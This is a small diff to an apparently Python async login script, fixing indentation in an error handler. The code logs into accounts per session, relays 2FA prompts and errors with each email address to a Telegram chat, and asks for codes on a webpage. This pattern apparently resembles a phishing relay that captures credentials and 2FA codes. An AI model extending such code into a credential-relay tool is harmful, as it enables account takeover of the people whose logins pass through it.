@@ -148,12 +148,13 @@ async def run_login(session_id):
                 session["status"] = "waiting_2fa"
                 bot.send_message(CHAT_ID, f"🔐 2FA required for {email}. Enter code on webpage.")
 
-       except Exception as e:
+        except Exception as e:
             import traceback
             print(f"LOGIN ERROR for {email}:", flush=True)
             print(traceback.format_exc(), flush=True)
             bot.send_message(CHAT_ID, f"❌ Error for {email}\n{str(e)[:250]}")
             sessions.pop(session_id, None)
+
 
 async def enter_2fa_code(session_id, code):
     session = sessions.get(session_id)
